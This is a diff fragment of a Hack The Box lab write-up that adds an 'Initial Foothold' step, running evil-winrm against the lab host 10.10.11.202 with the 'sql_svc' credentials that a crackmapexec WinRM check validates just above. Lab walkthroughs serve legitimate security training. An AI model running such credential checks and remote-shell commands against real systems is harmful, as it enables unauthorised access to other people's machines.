@@ -493,3 +493,7 @@ crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2f1beec6-8106-4baf-b763-77c901172509)
 
 Initial Foothold
+```shell
+evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/dbc73386-64dc-47b0-b9e1-d6b644f179f9)
